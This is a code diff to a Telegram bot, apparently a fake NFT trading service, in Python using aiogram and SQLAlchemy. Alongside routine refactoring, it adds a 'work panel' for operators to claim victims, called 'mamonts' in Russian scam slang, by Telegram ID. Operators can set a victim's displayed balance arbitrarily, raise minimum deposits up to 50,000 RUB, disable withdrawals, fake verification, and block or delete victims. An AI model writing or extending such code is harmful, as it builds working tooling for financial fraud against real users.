@@ -5,8 +5,11 @@ from aiogram.filters import StateFilter
 from aiogram.types import Message, FSInputFile
 from nft_bot.keyboards import kb
 from nft_bot.databases import requests
-from nft_bot.states import deposit_state, withdraw_state, admin_items_state
+from nft_bot.states import deposit_state, withdraw_state, admin_items_state, worker_state
 from nft_bot import config
+from sqlalchemy.ext.asyncio import AsyncSession
+from nft_bot.databases.models import User
+from sqlalchemy import update, select, delete
 
 bot: Bot = Bot(config.TOKEN)
 router = Router()
@@ -28,9 +31,6 @@ def get_translation(lang, key, **kwargs):
     return translation.format(**kwargs)
 
 
-
-
-
 """
 Callback handlers for Admin functionality
 """
@@ -39,7 +39,8 @@ Callback handlers for Admin functionality
 @router.message(F.text == 'Админ-панель')
 async def admin_panel(message: types.Message):
     if message.from_user.id in ADMIN_ID_LIST:
-        await bot.send_message(message.from_user.id, text='Вы вошли в админ-панель!', parse_mode="HTML", reply_markup=kb.admin_panel)
+        await bot.send_message(message.from_user.id, text='Вы вошли в админ-панель!', parse_mode="HTML",
+                               reply_markup=kb.admin_panel)
 
 
 @router.callback_query(lambda c: c.data == 'add_category')
@@ -49,15 +50,18 @@ async def add_category(call: types.CallbackQuery, state: admin_items_state.Admin
 
 
 @router.message(StateFilter(admin_items_state.AdminCategoriesItems.category))
-async def add_category_name(message: types.Message, state: admin_items_state.AdminCategoriesItems.category):
+async def add_category_name(message: types.Message, state: admin_items_state.AdminCategoriesItems.category,
+                            session: AsyncSession):
     category_name = message.text
-    await requests.add_category(category_name)
+    await state.clear()
+    await requests.add_category(session, category_name)
     await message.answer(text='Категория добавлена!', parse_mode="HTML")
 
 
 @router.callback_query(lambda c: c.data == 'add_item')
-async def add_item(call: types.CallbackQuery, state: admin_items_state.AdminCategoriesItems.item):
-    categories_keyboard = await kb.get_categories_kb()
+async def add_item(call: types.CallbackQuery, state: admin_items_state.AdminCategoriesItems.item,
+                   session: AsyncSession):
+    categories_keyboard = await kb.get_categories_kb(session)
     await call.message.answer(text='Выберите категорию:', parse_mode="HTML", reply_markup=categories_keyboard)
     await state.set_state(admin_items_state.AdminCategoriesItems.item)
 
@@ -105,7 +109,7 @@ async def add_item_author(message: types.Message, state: admin_items_state.Admin
 
 
 @router.message(StateFilter(admin_items_state.AdminItems.item_photo))
-async def add_item_photo(message: types.Message, state: admin_items_state.AdminItems.item_photo):
+async def add_item_photo(message: types.Message, state: admin_items_state.AdminItems.item_photo, session: AsyncSession):
     item_photo = message.text
     data = await state.get_data()
     category_id = data.get('category_id')
@@ -114,33 +118,362 @@ async def add_item_photo(message: types.Message, state: admin_items_state.AdminI
     item_description = data.get('item_description')
     item_price = data.get('item_price')
     item_author = data.get('item_author')
-    await requests.add_item(item_name, item_description, item_price, item_author,item_photo, category_id)
+    await requests.add_item(session, item_name, item_description, item_price, item_author, item_photo, category_id)
     await message.answer(text='NFT добавлен!', parse_mode="HTML")
     await state.clear()
 
 
 @router.callback_query(lambda c: c.data == 'delete_category')
-async def delete_category(call: types.CallbackQuery, state: admin_items_state.AdminCategoriesItems.category):
-    categories_keyboard = await kb.get_categories_kb2()
-    await call.message.answer(text='Выберите категорию для удаления:', parse_mode="HTML", reply_markup=categories_keyboard)
+async def delete_category(call: types.CallbackQuery, state: admin_items_state.AdminCategoriesItems.category,
+                          session: AsyncSession):
+    categories_keyboard = await kb.get_categories_kb2(session)
+    await call.message.answer(text='Выберите категорию для удаления:', parse_mode="HTML",
+                              reply_markup=categories_keyboard)
 
 
 @router.callback_query(lambda c: c.data.startswith('delete_category_'))
-async def delete_category_callback(call: types.CallbackQuery):
+async def delete_category_callback(call: types.CallbackQuery, session: AsyncSession):
     category_id = call.data.split('_')[2]
-    await requests.delete_category(category_id)
+    await requests.delete_category(session, int(category_id))
     await call.message.answer(text='Категория удалена!', parse_mode="HTML")
 
 
 @router.callback_query(lambda c: c.data == 'delete_item')
-async def delete_item(call: types.CallbackQuery, state: admin_items_state.AdminCategoriesItems.item):
-    items_keyboard = await kb.get_delete_items_kb()
+async def delete_item(call: types.CallbackQuery, state: admin_items_state.AdminCategoriesItems.item,
+                      session: AsyncSession):
+    items_keyboard = await kb.get_delete_items_kb(session)
     await call.message.answer(text='Выберите NFT для удаления:', parse_mode="HTML", reply_markup=items_keyboard)
 
 
 @router.callback_query(lambda c: c.data.startswith('delete_item_'))
-async def delete_item_callback(call: types.CallbackQuery):
+async def delete_item_callback(call: types.CallbackQuery, session: AsyncSession):
     item_id = call.data.split('_')[2]
-    await requests.delete_item(item_id)
+    await requests.delete_item(session, int(item_id))
     await call.message.answer(text='NFT удален!', parse_mode="HTML")
 
+
+@router.callback_query(lambda c: c.data == 'work_panel')
+async def edit_item(call: types.CallbackQuery):
+    await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text='Ворк-панель: ',
+                                parse_mode="HTML", reply_markup=kb.work_panel)
+
+
+@router.callback_query(lambda c: c.data == 'connect_mamont')
+async def connect_mamont(call: types.CallbackQuery, state: worker_state.WorkerPanel.mamont_id):
+    await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id,
+                                text='Введите <b>ID</b> лохматого 🦣:', parse_mode="HTML")
+    await state.set_state(worker_state.WorkerPanel.mamont_id)
+
+
+@router.message(StateFilter(worker_state.WorkerPanel.mamont_id))
+async def connect_mamont_id(message: types.Message, user: User, state: worker_state.WorkerPanel.mamont_id,
+                            session: AsyncSession):
+    mamont_id = message.text
+
+    if not mamont_id.isdigit():
+        await bot.send_message(chat_id=message.from_user.id, text='Введите корректный mamont_id!', parse_mode="HTML")
+        return
+
+    result = await session.execute(select(User).where(User.tg_id == int(mamont_id)))
+    user = result.scalars().first()
+
+    if not user:
+        await bot.send_message(chat_id=message.from_user.id, text='Такого mamont_id не существует!', parse_mode="HTML")
+        return
+
+    elif user.referer_id is not None:
+        await bot.send_message(chat_id=message.from_user.id, text='Этот mamont_id уже привязан!', parse_mode="HTML")
+        pass
+
+    else:
+        await state.update_data(mamont_id=mamont_id)
+        await session.execute(
+            update(User)
+            .where(User.tg_id == mamont_id)
+            .values(referer_id=message.from_user.id)
+        )
+        await state.clear()
+        await bot.send_message(chat_id=message.from_user.id, text='Лохматый привязан!', parse_mode="HTML")
+
+
+@router.callback_query(lambda c: c.data == 'control_mamonts')
+async def control_mamonts(call: types.CallbackQuery, session: AsyncSession, state: worker_state.WorkerMamont.mamont_id):
+    result = await session.execute(select(User).where(User.referer_id == call.from_user.id))
+    users = result.scalars().all()
+
+    if users:
+        text = 'Лохматые:\n\n'
+        for user in users:
+            text += f'ID: {user.tg_id}\n'
+        text += '\n<b>Всего лохматых:</b> ' + str(len(users))
+        text += '\nВведите ID лохматого ниже для управления: '
+    else:
+        text = 'У вас нет лохматых.'
+
+    await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=text,
+                                parse_mode="HTML", reply_markup=kb.back_to_admin)
+    await state.set_state(worker_state.WorkerMamont.mamont_id)
+
+
+@router.callback_query(lambda c: c.data == 'back_to_admin')
+async def back_to_admin(call: types.CallbackQuery, user: User):
+    await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text='Админ-панель: ',
+                                parse_mode="HTML", reply_markup=kb.admin_panel)
+
+
+@router.callback_query(lambda c: c.data == 'back_to_admin2')
+async def back_to_admin2(call: types.CallbackQuery, user: User):
+    await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text='Ворк-панель: ',
+                                parse_mode="HTML", reply_markup=kb.work_panel)
+
+
+@router.message(StateFilter(worker_state.WorkerMamont.mamont_id))
+async def mamont_control_panel(message: Message, session: AsyncSession, state: worker_state.WorkerMamont.mamont_id):
+    mamont_id = message.text
+    mamont_id = message.text
+
+    if not mamont_id.isdigit():
+        await bot.send_message(chat_id=message.from_user.id, text='Введите корректный mamont_id!', parse_mode="HTML")
+        return
+
+    result = await session.execute(select(User).where(User.tg_id == int(mamont_id)))
+    user = result.scalars().first()
+
+    if not user:
+        await bot.send_message(chat_id=message.from_user.id, text='Такого mamont_id не существует!', parse_mode="HTML")
+        return
+
+    if user.is_buying:
+        user_is_buying = 'Покупка включена'
+    else:
+        user_is_buying = 'Покупка выключена'
+
+    if user.is_withdraw:
+        user_is_withdraw = 'Вывод включен'
+    else:
+        user_is_withdraw = 'Вывод выключен'
+
+    if user.is_verified:
+        user_is_verified = 'Верифицирован'
+    else:
+        user_is_verified = 'Не верифицирован'
+
+    if user.is_blocked:
+        user_is_blocked = 'Заблокирован'
+    else:
+        user_is_blocked = 'Активен'
+
+    keyboard = await kb.create_mamont_control_kb(mamont_id, session)
+    text = (f'🏙 <b>Профиль лохматого</b> {mamont_id}\n\n'
+            f'<b>Информация</b>\n'
+            f'┠ Баланс: <b>{user.balance}</b>\n'
+            f'┠ Мин. депозит: <b>{user.min_deposit} RUB</b>\n'
+            f'┠ Мин. вывод: <b>{user.min_withdraw} RUB</b>\n'
+            f'┠ 🔰 <b>{user_is_buying}</b>\n'
+            f'┠ 🔰 <b>{user_is_withdraw}</b>\n'
+            f'┠ 🔐 <b>{user_is_blocked}</b>\n'
+            f'┖ 🔺 <b>{user_is_verified}</b>\n\n'
+            f'<b>Последний логин</b>\n'
+            f'┖ {user.last_login}')
+    await state.update_data(mamont_id=mamont_id)
+    await bot.send_message(chat_id=message.from_user.id, text=text, parse_mode="HTML", reply_markup=keyboard)
+
+
+@router.callback_query(lambda c: c.data.startswith('mamont|'))
+async def mamont_control_handler(call: types.CallbackQuery, state: worker_state.WorkerMamont.mamont_id, session: AsyncSession):
+    global new_mamont_deposit, new_mamont_withdraw
+    callback = call.data.split('|')[1]
+    state_info = await state.get_data()
+    mamont_id = state_info['mamont_id']
+    result = await session.execute(select(User).where(User.tg_id == int(mamont_id)))
+    user = result.scalars().first()
+    if callback == 'change_balance':
+        await bot.edit_message_text(message_id=call.message.message_id, chat_id=call.from_user.id, text='Введите сумму для пополнения баланса лохматого: ')
+        await state.set_state(worker_state.WorkerMamont.balance_amount)
+        return
+    elif callback == 'min_deposit':
+        min_mamont_deposit = user.min_deposit
+        if min_mamont_deposit == 5000:
+            new_mamont_deposit = 8000
+        elif min_mamont_deposit == 8000:
+            new_mamont_deposit = 10000
+        elif min_mamont_deposit == 10000:
+            new_mamont_deposit = 20000
+        elif min_mamont_deposit == 20000:
+            new_mamont_deposit = 50000
+        elif min_mamont_deposit == 50000:
+            new_mamont_deposit = 5000
+        await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(min_deposit=new_mamont_deposit))
+        await session.commit()
+    elif callback == 'min_withdraw':
+        min_mamont_withdraw = user.min_withdraw
+        if min_mamont_withdraw == 5000:
+            new_mamont_withdraw = 8000
+        elif min_mamont_withdraw == 8000:
+            new_mamont_withdraw = 10000
+        elif min_mamont_withdraw == 10000:
+            new_mamont_withdraw = 20000
+        elif min_mamont_withdraw == 20000:
+            new_mamont_withdraw = 50000
+        elif min_mamont_withdraw == 50000:
+            new_mamont_withdraw = 5000
+        await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(min_withdraw=new_mamont_withdraw))
+        await session.commit()
+    elif callback == 'unverify':
+        await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_verified=False))
+        await session.commit()
+    elif callback == 'verify':
+        await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_verified=True))
+        await session.commit()
+    elif callback == 'withdraw':
+        if user.is_withdraw:
+            await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_withdraw=False))
+            await session.commit()
+        else:
+            await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_withdraw=True))
+            await session.commit()
+    elif callback == 'buying':
+        if user.is_buying:
+            await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_buying=False))
+            await session.commit()
+        else:
+            await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_buying=True))
+            await session.commit()
+    elif callback == 'block':
+        await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_blocked=True))
+        await session.commit()
+    elif callback == 'unblock':
+        await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(is_blocked=False))
+        await session.commit()
+    elif callback == 'delete':
+        await session.execute(delete(User).where(User.tg_id == int(mamont_id)))
+        await session.commit()
+    elif callback == 'update':
+        result2 = await session.execute(select(User).where(User.tg_id == int(mamont_id)))
+        user = result2.scalars().first()
+
+        if user.is_buying:
+            user_is_buying = 'Покупка включена'
+        else:
+            user_is_buying = 'Покупка выключена'
+
+        if user.is_withdraw:
+            user_is_withdraw = 'Вывод включен'
+        else:
+            user_is_withdraw = 'Вывод выключен'
+
+        if user.is_verified:
+            user_is_verified = 'Верифицирован'
+        else:
+            user_is_verified = 'Не верифицирован'
+
+        if user.is_blocked:
+            user_is_blocked = 'Заблокирован'
+        else:
+            user_is_blocked = 'Активен'
+
+        keyboard = await kb.create_mamont_control_kb(mamont_id, session)
+        text = (f'🏙 <b>Профиль лохматого</b> {mamont_id}\n\n'
+                f'<b>Информация</b>\n'
+                f'┠ Баланс: <b>{user.balance}</b>\n'
+                f'┠ Мин. депозит: <b>{user.min_deposit} RUB</b>\n'
+                f'┠ Мин. вывод: <b>{user.min_withdraw} RUB</b>\n'
+                f'┠ 🔰 <b>{user_is_buying}</b>\n'
+                f'┠ 🔰 <b>{user_is_withdraw}</b>\n'
+                f'┠ 🔐 <b>{user_is_blocked}</b>\n'
+                f'┖ 🔺 <b>{user_is_verified}</b>\n\n'
+                f'<b>Последний логин</b>\n'
+                f'┖ {user.last_login}')
+        await call.answer('Успешно обновлено')
+        await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=text,
+                                    parse_mode="HTML", reply_markup=keyboard)
+        return
+
+    result2 = await session.execute(select(User).where(User.tg_id == int(mamont_id)))
+    user2 = result2.scalars().first()
+
+    if user2.is_buying:
+        user_is_buying = 'Покупка включена'
+    else:
+        user_is_buying = 'Покупка выключена'
+
+    if user2.is_withdraw:
+        user_is_withdraw = 'Вывод включен'
+    else:
+        user_is_withdraw = 'Вывод выключен'
+
+    if user2.is_verified:
+        user_is_verified = 'Верифицирован'
+    else:
+        user_is_verified = 'Не верифицирован'
+
+    if user2.is_blocked:
+        user_is_blocked = 'Заблокирован'
+    else:
+        user_is_blocked = 'Активен'
+
+    keyboard = await kb.create_mamont_control_kb(mamont_id, session)
+    text = (f'🏙 <b>Профиль лохматого</b> {mamont_id}\n\n'
+            f'<b>Информация</b>\n'
+            f'┠ Баланс: <b>{user2.balance}</b>\n'
+            f'┠ Мин. депозит: <b>{user2.min_deposit} RUB</b>\n'
+            f'┠ Мин. вывод: <b>{user2.min_withdraw} RUB</b>\n'
+            f'┠ 🔰 <b>{user_is_buying}</b>\n'
+            f'┠ 🔰 <b>{user_is_withdraw}</b>\n'
+            f'┠ 🔐 <b>{user_is_blocked}</b>\n'
+            f'┖ 🔺 <b>{user_is_verified}</b>\n\n'
+            f'<b>Последний логин</b>\n'
+            f'┖ {user2.last_login}')
+    await bot.edit_message_text(chat_id=call.from_user.id, message_id=call.message.message_id, text=text,
+                                parse_mode="HTML", reply_markup=keyboard)
+
+
+@router.message(StateFilter(worker_state.WorkerMamont.balance_amount))
+async def change_mamont_balance(message: Message, session: AsyncSession, state: worker_state.WorkerMamont.balance_amount):
+    await message.delete()
+    balance_amount = message.text
+    if not balance_amount.isdigit():
+        await bot.send_message(chat_id=message.from_user.id, text='Введите корректную сумму!', parse_mode="HTML")
+        return
+    state_info = await state.get_data()
+    mamont_id = state_info['mamont_id']
+    await session.execute(update(User).where(User.tg_id == int(mamont_id)).values(balance=int(balance_amount)))
+    await session.commit()
+    await state.clear()
+    await bot.send_message(chat_id=message.from_user.id, text='Баланс изменен!')
+    result = await session.execute(select(User).where(User.tg_id == int(mamont_id)))
+    user = result.scalars().first()
+
+    if user.is_buying:
+        user_is_buying = 'Покупка включена'
+    else:
+        user_is_buying = 'Покупка выключена'
+
+    if user.is_withdraw:
+        user_is_withdraw = 'Вывод включен'
+    else:
+        user_is_withdraw = 'Вывод выключен'
+
+    if user.is_verified:
+        user_is_verified = 'Верифицирован'
+    else:
+        user_is_verified = 'Не верифицирован'
+
+    if user.is_blocked:
+        user_is_blocked = 'Заблокирован'
+    else:
+        user_is_blocked = 'Активен'
+
+    keyboard = await kb.create_mamont_control_kb(mamont_id, session)
+    text = (f'🏙 <b>Профиль лохматого</b> {mamont_id}\n\n'
+            f'<b>Информация</b>\n'
+            f'┠ Баланс: <b>{user.balance}</b>\n'
+            f'┠ Мин. депозит: <b>{user.min_deposit} RUB</b>\n'
+            f'┠ Мин. вывод: <b>{user.min_withdraw} RUB</b>\n'
+            f'┠ 🔰 <b>{user_is_buying}</b>\n'
+            f'┠ 🔰 <b>{user_is_withdraw}</b>\n'
+            f'┠ 🔐 <b>{user_is_blocked}</b>\n'
+            f'┖ 🔺 <b>{user_is_verified}</b>\n\n'
+            f'<b>Последний логин</b>\n'
+            f'┖ {user.last_login}')
+    await bot.send_message(chat_id=message.from_user.id, text=text, parse_mode="HTML", reply_markup=keyboard)
